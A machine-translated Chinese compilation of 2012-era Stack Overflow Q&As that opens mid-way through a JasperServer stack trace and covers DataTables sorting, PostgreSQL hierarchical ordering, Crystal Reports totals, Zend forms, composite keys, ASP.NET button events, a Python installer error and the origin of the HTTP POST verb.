at org.springframework.webflow.action.DispatchMethodInvoker.invoke(DispatchMethodInvoker.java:98) 
at org.springframework.webflow.action.MultiAction.doExecute(MultiAction.java:123)
at org.springframework.webflow.action.AbstractAction.execute(AbstractAction.java:188) 
at org.springframework.webflow.execution.ActionExecutor.execute(ActionExecutor.java:51) 
at org.springframework.webflow.action.EvaluateAction.doExecute(EvaluateAction.java:79) 
at org.springframework.webflow.action.AbstractAction.execute(AbstractAction.java:188) 
at org.springframework.webflow.execution.AnnotatedAction.execute(AnnotatedAction.java:145) 
at org.springframework.webflow.execution.ActionExecutor.execute(ActionExecutor.java:51) 
at org.springframework.webflow.engine.ActionState.doEnter(ActionState.java:101) 
at org.springframework.webflow.engine.State.enter(State.java:194) 
at org.springframework.webflow.engine.Transition.execute(Transition.java:227) 
at org.springframework.webflow.engine.impl.FlowExecutionImpl.execute(FlowExecutionImpl.java:391) 
at org.springframework.webflow.engine.impl.RequestControlContextImpl.execute(RequestControlContextImpl.java:214) 
at org.springframework.webflow.engine.TransitionableState.handleEvent(TransitionableState.java:119) 
at org.springframework.webflow.engine.Flow.handleEvent(Flow.java:555) 
at org.springframework.webflow.engine.impl.FlowExecutionImpl.handleEvent(FlowExecutionImpl.java:386) 
at org.springframework.webflow.engine.impl.RequestControlContextImpl.handleEvent(RequestControlContextImpl.java:210) 
at org.springframework.webflow.engine.ViewState.handleEvent(ViewState.java:230) 
at org.springframework.webflow.engine.ViewState.resume(ViewState.java:196) 
at org.springframework.webflow.engine.Flow.resume(Flow.java:545) 
at org.springframework.webflow.engine.impl.FlowExecutionImpl.resume(FlowExecutionImpl.java:259) 
at org.springframework.webflow.executor.FlowExecutorImpl.resumeExecution(FlowExecutorImpl.java:163) 
at sun.reflect.GeneratedMethodAccessor234.invoke(Unknown Source) 
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 
at java.lang.reflect.Method.invoke(Method.java:597) 
at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:307) 
at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:182) 
at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:149) 
at org.springframework.security.intercept.method.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:66) 
at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:171) 
at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:204) 
at $Proxy19.resumeExecution(Unknown Source) 
at org.springframework.webflow.mvc.servlet.FlowHandlerAdapter.handle(FlowHandlerAdapter.java:183) 
at org.springframework.webflow.mvc.servlet.FlowController.handleRequest(FlowController.java:174) 
at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48) 
at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:875) 
at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:807) 
at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:571) 
at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:501) 
at javax.servlet.http.HttpServlet.service(HttpServlet.java:617) 
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:399) 
at com.jaspersoft.jasperserver.api.security.IPadSupportFilter.doFilter(IPadSupportFilter.java:67) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.api.security.JSSwitchUserProcessingFilter.doFilterHttp(JSSwitchUserProcessingFilter.java:154) 
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.intercept.web.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:109) 
at org.springframework.security.intercept.web.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:83) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.ui.ExceptionTranslationFilter.doFilterHttp(ExceptionTranslationFilter.java:101) 
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.providers.anonymous.AnonymousProcessingFilter.doFilterHttp(AnonymousProcessingFilter.java:105) 
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.api.metadata.user.service.impl.MetadataAuthenticationProcessingFilter.doFilter(MetadataAuthenticationProcessingFilter.java:139) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411)
at com.jaspersoft.jasperserver.war.util.RequestParameterAuthenticationFilter.doFilter(RequestParameterAuthenticationFilter.java:97) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.ui.basicauth.BasicProcessingFilter.doFilterHttp(BasicProcessingFilter.java:174) 
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.war.UserPreferencesFilter.doFilter(UserPreferencesFilter.java:184) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.ui.AbstractProcessingFilter.doFilterHttp(AbstractProcessingFilter.java:278)
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.war.UserPreferencesFilter.doFilter(UserPreferencesFilter.java:184) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.api.logging.filter.BasicLoggingFilter.doFilter(BasicLoggingFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.api.security.JSCsrfGuardFilter.doFilter(JSCsrfGuardFilter.java:81) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.api.security.WebAppSecurityFilter.doFilter(WebAppSecurityFilter.java:83) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at com.jaspersoft.jasperserver.war.MultipartRequestWrapperFilter.doFilter(MultipartRequestWrapperFilter.java:90) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.context.HttpSessionContextIntegrationFilter.doFilterHttp(HttpSessionContextIntegrationFilter.java:235) 
at org.springframework.security.ui.SpringSecurityFilter.doFilter(SpringSecurityFilter.java:53) 
at org.springframework.security.util.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:411) 
at org.springframework.security.util.FilterChainProxy.doFilter(FilterChainProxy.java:188) 
at org.springframework.security.util.FilterToBeanProxy.doFilter(FilterToBeanProxy.java:99) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) 
at com.jaspersoft.jasperserver.war.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:67) 
at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:236) 
at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:167) 
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235) 
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206) 
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233) 
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191) 
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:558) 
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127) 
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) 
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) 
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298) 
at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:859) 
at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:579) 
at org.apache.tomcat.util.net.AprEndpoint$Worker.run(AprEndpoint.java:1555) 
at java.lang.Thread.run(Thread.java:619) Caused by: java.io.StreamCorruptedException: invalid stream header: 3C3F786D 
at java.io.ObjectInputStream.readStreamHeader(ObjectInputStream.java:783) 
at java.io.ObjectInputStream.<init>(ObjectInputStream.java:280) 
at net.sf.jasperreports.engine.util.ContextClassLoaderObjectInputStream.<init>(ContextClassLoaderObjectInputStream.java:53) 
at net.sf.jasperreports.repo.DefaultRepositoryService.loadObject(DefaultRepositoryService.java:202) ... 131 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T17:27:15.247

您是否将子报表部署到 Jasper 报表服务器？

```
Error loading object from : repo:SUB_REPORT_NAME 
```

这意味着主报表无法在 Jasper 服务器存储库中找到名为“SUB_REPORT_NAME”的子报表，看起来您尚未将子报表作为主报表内的资源部署到服务器。

在 iReport JS Repository Navigator 中，您应该看到如下内容：

我的报告 - Main.jrxml - 输入控件（文件夹） - 资源 - Sub-report-1.jrxml - Sub-Report-2.jrxml

在主报告的内部，您应该将子报告称为：

```
<subreport isUsingCache="true">
    ....
    <subreportExpression><![CDATA["repo:Sub-report-1.jrxml"]]></subreportExpression>
    ..... 
```

# jquery - jquery datatables 列没有正确排序

> ID：10218499
> 
> 赞同：4
> 
> 时间：2012-04-18T21:44:16.603
> 
> 标签：jquery, sorting, datatables

我想我知道这个问题，但我不知道如何正确处理它，所以我希望这里有人遇到类似的问题并设法解决它。我所拥有的是一个包含几列的表格，除了一个之外，所有这些列都可以进行排序。下面是该列的屏幕截图及其在工作中的排序。

![在此处输入图像描述](../Images/866417f5ebd9e4c6d3f1c8bead57474d.png)

如您所见，它没有根据字母数字逻辑进行排序。我的假设是某些名称中包含字符，例如逗号的括号、方括号等。也就是说，我将如何解决这个问题，以便我可以使用数据表插件对这个字母数字进行排序？想法？

****编辑****

这是我正在使用的代码，适用于除这一列之外的所有内容。

```
jQuery.fn.dataTableExt.oSort['num-asc']  = function(a,b) {
    var x = a.replace( /<.*?>/g, "" );
    var y = b.replace( /<.*?>/g, "" );
    x = parseFloat( x );
    y = parseFloat( y );
    return ((x < y) ? -1 : ((x > y) ?  1 : 0));
};

jQuery.fn.dataTableExt.oSort['num-desc'] = function(a,b) {
    var x = a.replace( /<.*?>/g, "" );
    var y = b.replace( /<.*?>/g, "" );
    x = parseFloat( x );
    y = parseFloat( y );
    return ((x < y) ?  1 : ((x > y) ? -1 : 0));
};

$(document).ready(function() {
    $('#ledger').dataTable({
        bAutoWidth: false,
        bJQueryUI : true,
        bProcessing: true,
        bServerSide: false,
        sPaginationType: "full_numbers",
        bStateSave : false,
        bUseRendered: false,
        iDisplayLength: ${entriesValue},
        sDom: mw.superadmin.datatable.relatedListDom,
        aLengthMenu: mw.superadmin.datatable.relatedListLengthMenu,
        aaSorting: [[0,'asc']],
        aoColumns: [
            null,
            { "iDataSort": 2},
            { "bVisible": false, "sType": "num"},
            { "iDataSort": 4, "bSortable": true },
            { "bVisible": false, "sType": "num"}
        ]
    }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:59:46.993

由于您显示的是链接，我猜您正在使用自定义渲染功能？

如果是这种情况，请在列定义中设置以下内容：

```
"bUseRendered": false 
```

这将使表格按数据排序，而不是渲染输出。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T22:01:42.353

我相信最好的方法是使用 aoColumnDefs。尝试这个：

```
"aoColumnDefs": [
   {
   "sType": "string"
   }
] 
```

如果这不起作用，您可能需要创建自定义排序功能。请参阅[此链接](http://datatables.net/examples/basic_init/multi_col_sort.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-06T19:13:02.290

在我的情况下，我的第一列包含图像，我发现对该列进行排序正在正确地对第二列进行排序，但是当我单击对第二列进行排序时，它的排序不正确。我通过'aTargets'禁用第一列并将'sType'设置为'null'来解决这个问题：

```
 "aoColumnDefs": [
        { 'bSortable': true, 'sType':"null", 'aTargets': [1, 6] },
    ] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-11-30T07:16:53.317

如果您使用自定义渲染方法，请使用“类型”的值来区分实际数据和您的自定义视图。如下所示，

```
"render": function ( data, type, full, meta ) {
    if ( type === 'display' ) {
        return '<a class="btn btn-link">' + full['description'] + '</a>';                       
    }
    return full['description'];
} 
```

在内部，数据表将类型作为“显示”传递，同时在进行排序、搜索时生成视图和其他值......等

# postgresql - 按对象关系排序 (PostgreSQL)

> ID：10218500
> 
> 赞同：1
> 
> 时间：2012-04-18T21:44:19.717
> 
> 标签：postgresql

例如有 2 个表：

**在第一个：**对象和父列

```
object | parent 
-------+---------
object1| null       
object2| object1  
object3| null 
```

**第二个有：**对象和参考列

```
object | reference
-------+---------
object1| null       
object2| null       
object3| object1 
```

需要查询表以按如下顺序排列：首先是父级，然后是 - 子级，对象具有对父级的引用。

```
object1
object2
object3 
```

是否可以在一个 SQL 查询中执行或需要在数组中手动​​排序？似乎这是一项经典任务，可能解决方案已经存在于某处？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T06:59:19.900

这是你要找的吗？

```
CREATE TABLE oparen (object varchar(10), parent varchar(10));
CREATE TABLE oref (object varchar(10), ref varchar(10));
INSERT INTO oparen VALUES
    ('object1',null),('object2','object1'),
    ('object3',null),('object4','object2');
INSERT INTO oref VALUES
    ('object1',null),('object2',null),('object3','object1'),
    ('object5','object6'),('object6','object1'),('object7','object4');

WITH hier AS (
    SELECT parent AS obj, 1 AS rank FROM oparen
     WHERE parent IS NOT NULL
    UNION
    SELECT object, 2 FROM oparen
     WHERE parent IS NOT NULL
    UNION
    SELECT object, 3 FROM oref
     WHERE ref IS NOT NULL),
allobj AS (
    SELECT object AS obj FROM oparen
    UNION
    SELECT object FROM oref)
SELECT a.obj, coalesce(h.rank, 4) AS rank
  FROM allobj a LEFT JOIN hier h ON a.obj = h.obj
 ORDER BY coalesce(h.rank, 4), a.obj; 
```

**编辑：**在以下答案中的改进示例之后，以下查询应该可以解决问题：

```
WITH parents AS (
    SELECT parent AS obj, 1 AS rank FROM oparen
     WHERE parent IS NOT NULL
    ),
family AS (
    SELECT * FROM parents
    UNION ALL
    SELECT object, 2 FROM oparen op
     WHERE parent IS NOT NULL
       AND NOT EXISTS (SELECT obj FROM parents WHERE obj = op.object)
    ),
hier AS (
    SELECT * FROM family
    UNION ALL
    SELECT object AS obj, coalesce(f.rank + 2, 5) AS rank
      FROM oref LEFT JOIN family f ON oref.ref = f.obj
     WHERE ref IS NOT NULL
    ),
allobj AS (
    SELECT object AS obj FROM oparen
    UNION
    SELECT object FROM oref)
SELECT a.obj, h.rank AS rank
  FROM allobj a LEFT JOIN hier h ON a.obj = h.obj
 ORDER BY h.rank, a.obj; 
```

顶部的测试平台创建根据新要求进行更新。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-02T10:06:27.270

以下递归查询有效：

```
WITH RECURSIVE tables(object, rank) AS (
    SELECT DISTINCT o.object, 1 AS rank FROM oref o
    WHERE o.ref IS NULL
    UNION
    SELECT o.object, t.rank + 1 AS rank
    FROM (SELECT DISTINCT o.object, o.ref FROM oref o
            WHERE ref IS NOT NULL) o, tables t
    WHERE o.ref = t.object AND rank <= t.rank
),
ordered AS (
    SELECT * FROM tables
)
SELECT * FROM tables 
WHERE tables.rank = (SELECT MAX(rank) FROM ordered WHERE ordered.object = tables.object)
ORDER BY rank; 
```

有任何意见、问题、反对意见、建议吗？;)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-29T21:03:11.573

不，不起作用：检查其他数据并简化使用，仅通过 oref 表内容：

```
INSERT INTO oref VALUES
('object1',null),('object2',null),('object3','object1'),
('object5','object6'),('object6','object1'),('object7','object4'), ('object4','object5');

WITH family AS (
    SELECT object AS obj, 1 AS rank FROM oref
     WHERE ref IS NULL
    ),
hier AS (
    SELECT * FROM family
    UNION ALL
    SELECT object AS obj, coalesce(f.rank + 2, 5) AS rank
      FROM oref LEFT JOIN family f ON oref.ref = f.obj
     WHERE ref IS NOT NULL
    ),
allobj AS (
    SELECT object AS obj FROM oref)
SELECT a.obj, h.rank AS rank
  FROM allobj a
  LEFT JOIN hier h ON a.obj = h.obj
 ORDER BY h.rank, a.obj; 
```

认为需要在这里使用递归查询。将在这里写和发布。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-20T06:04:33.677

我插入了以下数据：

```
INSERT INTO oparen VALUES
    ('object1',null),('object2','object1'),('object3',null),('object4','object2');
INSERT INTO oref VALUES
    ('object1',null),('object2',null),('object3','object1'),('object5','object6'),('object6','object1'); 
```

顺序不正确，object2 列出了两次。obj 上的 DISTINCT 也破坏了顺序。应该去 6 然后 5。

# crystal-reports - Crystal Reports 按年份比较运行总计

> ID：10218502
> 
> 赞同：1
> 
> 时间：2012-04-18T21:44:23.160
> 
> 标签：crystal-reports

我正在使用 Crystal Reports XI R2。

我的表按日期有交易数据。我有一个按天设置的组和一个摘要，以计算每天的交易数量。我还设置了一个运行总计，以便为每一天提供年初至今的计数。当然，它会根据年份的变化重新设置。

我的目标是能够找到昨天的 YTD 计数与去年同一日期的相同计数之间的差异。

编辑：我错报了目标。不是仅仅能够找到昨天的差异，而是能够找到一系列日子中的每一天。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:15:21.310

我终于确定了这一点。这样做可能有一种更清洁的方法，但是....

我将日期（以文本 yyyy-mm-dd 开始）转换为文本 mm/dd/yyyy 格式：

```
stringvar yyyyear := {table.dateField}[1 to 4]; 
stringvar mmonth := {table.dateField}[6 to 7];;
stringvar dday := {table.dateField}[9 to 10];

mmonth + "/" + dday + "/" + yyyyear 
```

按此字段分组并在组标题中插入计数摘要。为每个日期的 mm/dd 部分创建了一个单独的字段：

```
{@textDate}[1 to 5] 
```

添加了一个标志以查看当前组标题中的日期是否与前一个匹配：

```
if previous({@mm/dd}) = {@mm/dd}
    then 1
else 0 
```

使用共享变量存储每年的 YTD 总数（2 个公式）：

```
shared numbervar totalsCurentYear;

if {@prevDateFlag} = 1 then 
    totalsCurrentYear := totalsCurrentYear + Sum ({@transactionCount}, {@textDate});

totalsCurrentYear 
```

|

```
shared numbervar totalsLastYear;

if {@prevDateFlag} = 1 then 
    totalsLastYear := totalsLastYear + Sum ({@transactionCount}, {@textDate});

totalsLastYear 
```

将这两个都放入组页脚（被抑制）并添加一个字段以在组标题中进行减法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:38:41.137

创建这两个公式字段：

```
//{@LastYearToDate}
If {table.dateField} IN LastYearYTD Then
  1
Else
  0

//{@ThisYearToDate}
If {table.dateField} IN YearToDate Then
  1
Else
  0 
```

在 ReportFooter 部分中的每个字段上插入摘要。

# zend-framework - ZendFramework 在自定义操作中回显表单

> ID：10218505
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:44:27.683
> 
> 标签：zend-framework, zend-form

我有一个具有以下操作的控制器：

```
public function addAction()
{
    //action for the comments submission
    $form = new Application_Form_Comment();
    $form->submit->setLabel('Comment');
    $this->view->form = $form;
    if ($this->getRequest()->isPost()) {
        $formData = $this->getRequest()->getPost();
        if ($form->isValid($formData)) {
        $comment = new Application_Model_DbTable_Comments();
        $comment->addComment($formData['comment'], $id);
            $this->_helper->redirector('index');
        } else {
            $form->populate($formData);
        }
    } 
```

在我看来，如果我回显 $this->form; 表格不显示。

里克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:47:01.447

假设您试图将表单与任何特定控制器分开，您可以使用视图助手。[自己写很容易](http://framework.zend.com/manual/en/zend.view.helpers.html#zend.view.helpers.custom)。

创建`application/views/helpers/CommentForm.php`将包含以下内容的文件：-

```
class Zend_View_Helper_CommentForm extends Zend_View_Helper_Abstract
{
    public function commentForm()
    {
        $form = new Application_Form_Comment();
        return $form;
    }
} 
```

然后在您需要的任何视图中，只需执行以下操作：-

```
echo $this->commentForm(); 
```

这将呈现您的表单。

# database - 使表中的行唯一

> ID：10218513
> 
> 赞同：0
> 
> 时间：2012-04-18T21:44:53.970
> 
> 标签：database

是否可以使数据库表中的一行唯一？如果有怎么办？我知道您可以使字段唯一，例如“John”不能在名称字段中出现两次。但是如果我有类似的东西怎么办：

```
name: John
id: 1
foreign_key: 1

name: John
id: 2
foreign_key: 1 
```

在这种情况下，这会很好，因为它们相同但不同。

在哪里可以防止这种情况：

```
name: John
id: 1
foreign_key: 1

name: John
id: 1
foreign_key: 1 
```

很难证明，因为显而易见的答案是使 foreign_key 唯一，但在我的情况下，它是多对多关系，因此 ID 或外键可能会出现很多次，但不应该在所有列中都有相同的数据。

即这应该工作：

```
id: 1
fKey: 2
afKey: 3

id: 1
fKey: 3
afKey: 3 
```

但不是当 fKey 和 afKey 在两行中匹配时，例如：

```
id: 1
fKey: 2
afKey: 3

id: 1
fKey: 2
afKey: 3 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:47:29.880

要使行唯一，您可以将所有 3 列设为复合主键。

[http://dev.mysql.com/doc/refman/5.0/en/multiple-column-indexes.html](http://dev.mysql.com/doc/refman/5.0/en/multiple-column-indexes.html)

# c# - 如何在代码后面使用值调用 Button OnCLick 事件处理程序？

> ID：10218523
> 
> 赞同：0
> 
> 时间：2012-04-18T21:45:40.370
> 
> 标签：c#, asp.net

我正在尝试在代码后面创建锚点，并为每个锚点删除按钮。我不知道我是否可以为每个带有 ID 的链接调用事件处理程序，以便我可以从数据库中删除指定的行。这就是我所做的。我创建了一个锚点和一个 ASp 按钮，但不确定如何使用该 ImageID 调用它。是否可以？如果有怎么办？非常感谢提前！！这是在 C#、asp.net 中。

```
 HtmlAnchor apdf = new HtmlAnchor();
 apdf.ID = Guid.NewGuid().ToString("N");
 string ImageID = "";
 if (dsreport != null && dsreport.Tables[0].Rows.Count > 0)
 {
      apdf.InnerText = dsreport.Tables[0].Rows[0]["ImageName"].ToString();
      apdf.Attributes.Add("style", "font-weight: bold; font-size: 13px; margin: 0px;    font-family: Arial; color: #1e7c9b; text-decoration: underline");
      apdf.Target = "_blank";
      ImageSalesID = dsreport.Tables[0].Rows[0]["ImageID"].ToString();
      apdf.HRef = "PDFdownload.aspx?ID=" + ImageID;

 }   
 Button btnDelete = new Button();
 btnDelete.ID = Guid.NewGuid().ToString("N");
 btnDelete.OnClick += Eventhandler;
 btnDelete.Text = "Delete"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:54:01.727

我希望这可以在某种程度上帮助你

```
 Button btnDelete = new Button();
    btnDelete.Click += new EventHandler(button_Click);

    protected void button_Click (object sender, EventArgs e)
    {
        Button button = sender as Button;
        string buttonid = button.ID.ToString()
        // identify which button was what row to update based on id clicked and perform necessary actions
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:25:16.943

据我所知，您正在按下一个按钮，然后想要删除与该按钮相关的内容；如果是这种情况，我建议`CommandArgument`在按钮上使用该属性。您还可以指定`CommandName`可以帮助确定要发生什么类型的操作。这是一个简单的例子：

```
<asp:Button ID="btnDelete" runat="server" CommandName="DeleteRow" CommandArgument="1" Text="Delete Row 1" OnClick="DeleteRow" />
<asp:Button ID="btnDelete" runat="server" CommandName="DeleteRow" CommandArgument="2" Text="Delete Row 2" OnClick="DeleteRow" />
<asp:Button ID="btnDelete" runat="server" CommandName="DeleteRow" CommandArgument="3" Text="Delete Row 3" OnClick="DeleteRow" /> 
```

所有 3 个按钮都将触发相同的事件。然后在实际事件本身中，您可以通过将其转换为 来检查发送方的命令参数`Button`，就像这样。

```
protected void DeleteRow(object sender, EventArgs e)
{
    var buttonClicked = sender as Button;
    var rowId = buttonClicked.CommandArgument;
    var action = buttonClicked.CommandName;

    // do something depending on the action and the argument
} 
```

希望这可以帮助。:)

# python - 在 Python 3.2.3 上分发 0.6.26 的安装问题

> ID：10218524
> 
> 赞同：2
> 
> 时间：2012-04-18T21:45:42.280
> 
> 标签：python, setuptools, distribute, attributeerror

在 Windows 7 Python 3.2.3 上工作并安装了一些需要 setuptools 的东西。由于版本兼容性问题，改为分发 0.6.26。但是当我去安装它时，我收到以下错误：

```
File "C:\Python32\distribute_setup.py", line 494, in <module>
main(sys.argv[1:])
File "C:\Python32\distribute_setup.py", line 489, in main
tarball = download_setuptools()
File "C:\Python32\distribute_setup.py", line 192, in download_setuptools
log.warn("Downloading %s", url)
File "C:\Python32\lib\distutils\log.py", line 47, in warn
self._log(WARN, msg, args)
File "C:\Python32\lib\distutils\log.py", line 30, in _log
if stream.errors == 'strict':
AttributeError: errors 
```

我可能做错了一些基本的事情。有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T20:59:18.920

似乎 Distribute 和 3.2.3 存在问题。找到一个站点，其中包含一些可与 3.2.3 一起正常工作的非官方分叉安装程序。这是：[http ://www.lfd.uci.edu/~gohlke/pythonlibs/](http://www.lfd.uci.edu/~gohlke/pythonlibs/)

# http - 为什么 HTTP 动词 POST 称为 POST？

> ID：10218530
> 
> 赞同：15
> 
> 时间：2012-04-18T21:46:27.603
> 
> 标签：http, rest, post

其他动词对我来说都很有意义，但我没有太多关于“post”作为动词的上下文。是像在邮局里发帖（这有点道理，虽然看起来有点牵强）还是像在布告栏上发帖（对我来说意义不大）？有谁知道谁决定“POST”以及为什么选择它？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-18T22:01:31.303

嗯，我猜，“*在公告板上发帖*”很接近答案。最后，这正是该方法设计的功能之一。`POST`总是意味着将东西发布到某种“工厂”以由它处理 - 否则你可以只使用`PUT`. 让我们看一下[RFC2616，第 9.5 节](http://www.ietf.org/rfc/rfc2616.txt)：

> POST 方法用于请求源服务器接受请求中包含的实体，作为 Request-Line 中 Request-URI 标识的资源的新下级。POST 旨在允许统一的方法涵盖以下功能：
> 
> ```
>  - Annotation of existing resources;
> 
>   - Posting a message to a bulletin board, newsgroup, mailing list,
>     or similar group of articles;
> 
>   - Providing a block of data, such as the result of submitting a
>     form, to a data-handling process;
> 
>   - Extending a database through an append operation. 
> ```

当然，这不是它为什么被称为的确切定义`POST`，但我认为这可能会提供一些关于它背后的想法的线索。

也许我们也可以看看“post”这个词的一些含义（[http://www.thefreedictionary.com/Post](http://www.thefreedictionary.com/Post)，第三个定义）——据此，post 作为动词可以表示

*   邮寄（信件或包裹）
*   通知最新消息
*   将（项目）转移到簿记中的分类帐
*   在（分类帐）中进行必要的分录

这正是`POST`（隐喻地）所做的。如果您想发送电子邮件，请让您的电子邮件提供商处理它​​，然后通知您有关状态。这也是`PUT`and之间的区别`POST`：如果客户端负责处理资源，则您使用`PUT`（因为您知道该放什么以及放哪里）。

因此，理论上，如果您知道要向其发送电子邮件的人的 IP 地址，您就不需要您的提供商为您找到这些东西。但是现在，您知道该放*什么*，但不知道放*哪里*。因此，在这种情况下，您使用`POST`. 你“通知服务器最新消息”，服务器决定把它放在哪里。因此，您可以将其视为“将项目转移”到已经存在的资源（例如论坛中的线程或其他东西）-您只是想附加一些东西。

我希望这有任何意义......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:04:36.280

POST 方法用于请求源服务器接受请求中包含的实体，作为 Request-Line 中 Request-URI 标识的资源的新下级。POST 旨在允许统一的方法涵盖以下功能：

*   现有资源的注释；
*   将消息发布到公告板、新闻组、邮件列表或类似的文章组；
*   向数据处理过程提供数据块，例如提交表单的结果；
*   通过追加操作扩展数据库。

[W3 / 发布](http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html)

REST 要求开发人员以与协议定义一致的方式显式使用 HTTP 方法。这种基本的 REST 设计原则在创建、读取、更新和删除 (CRUD) 操作与 HTTP 方法之间建立了一对一的映射。根据这个映射：

*   要在服务器上创建资源，请使用 POST。
*   要检索资源，请使用 GET。
*   要更改资源的状态或更新它，请使用 PUT。
*   要移除或删除资源，请使用 DELETE。

[IBM / 休息](http://www.ibm.com/developerworks/webservices/library/ws-restful/)

当我们发布时，我们实际上是在发送新数据（创建资源），但不会获取它或调用更新或要求粉碎我们的旧文档。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:49:56.223

我不认为像“寄信”这样的帖子太牵强了。毕竟，POST 请求是包含数据的消息。至于 who，动词来自 HTTP，因此起源于 Tim Berners-Lee 在 1995 年编写的 Html 规范。

# meteor - 流星中的 cursor.observe({add}) 行为

> ID：10218534
> 
